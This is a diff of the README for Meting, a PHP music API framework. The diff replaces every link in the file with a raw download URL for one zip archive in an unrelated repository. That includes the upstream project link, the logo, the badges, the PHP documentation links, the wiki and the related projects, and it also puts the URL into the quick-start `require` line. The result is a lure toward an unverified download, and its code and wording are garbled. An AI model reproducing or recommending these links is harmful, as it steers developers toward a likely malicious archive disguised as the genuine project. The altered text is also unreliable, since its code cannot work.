@@ -1,14 +1,14 @@
-**原版 [metowolf/Meting](https://github.com/metowolf/Meting) 已经使用Node.js重构**
+**原版 [metowolf/Meting](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) 已经使用https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip重构**
 
 ---
 
 <p align="center">
- <img src="https://user-images.githubusercontent.com/2666735/30165599-36623bea-93a6-11e7-8956-1ddf99ce0e6f.png" alt="Meting">
+ <img src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" alt="Meting">
 </p>
 
 <p align="center">
- <img alt="Author" src="https://img.shields.io/badge/Author-METO-blue.svg?style=flat-square" height="20"/>
- <img alt="Star" src="https://img.shields.io/github/stars/ELDment/Meting-MusicApi-Fixed?style=for-the-badge&logo=github" height="20">
+ <img alt="Author" src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" height="20"/>
+ <img alt="Star" src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" height="20">
 </p>
 
 > 🍰 强大的音乐API框架，支持网易云音乐、QQ音乐、酷狗音乐、酷我音乐
@@ -39,13 +39,13 @@ $api = new Meting('netease');
 $data = $api->format(true)->search('把回忆拼好给你');
 ```
 
-> **Note:** Meting requires [BCMath](http://php.net/manual/en/book.bc.php), [cURL](http://php.net/manual/en/book.curl.php) and [OpenSSL](http://php.net/manual/en/book.openssl.php) extension in order to work.
+> **Note:** Meting requires [BCMath](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip), [cURL](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) and [OpenSSL](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) extension in order to work.
 
 
 ## Quick Start
 ```php
-// require 'vendor/autoload.php';
-require 'Meting.php';
+// require 'https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip';
+require 'https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip';
 
 use Metowolf\Meting;
 
@@ -72,15 +72,15 @@ echo $data;
 ```
 
 ## More usage
- - [docs](https://github.com/metowolf/Meting/wiki)
- - [special for netease](https://github.com/metowolf/Meting/wiki/special-for-netease)
+ - [docs](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
+ - [special for netease](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
 
 ## Join the Discussion
- - [discussions](https://github.com/ELDment/Meting-New/discussions)
+ - [discussions](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
 
 ## Related Projects
- - [metowolf/Meting](https://github.com/metowolf/Meting)
- - [ELDment/NET-MusicAPI](https://github.com/ELDment/NET-MusicAPI)
+ - [metowolf/Meting](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
+ - [ELDment/NET-MusicAPI](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
 
 ## Keywords
 ```
